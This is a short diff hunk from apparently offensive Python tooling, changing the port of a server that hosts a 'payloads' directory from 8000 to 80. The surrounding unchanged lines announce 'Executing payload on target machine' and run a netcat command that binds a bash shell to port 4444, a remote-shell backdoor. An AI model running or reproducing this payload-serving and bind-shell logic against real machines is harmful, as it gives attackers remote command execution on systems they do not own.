@@ -36,7 +36,7 @@ def somerandomcode1():
     
     print("[*] Is it someone new?")
     nri.stop_server()
-    nri.create_server("payloads", 8000)
+    nri.create_server("payloads", 80)
     time.sleep(60)
     csi.speak("Executing payload on target machine...")
     csi.execute_command("nc -l :4444 -e /bin/bash")
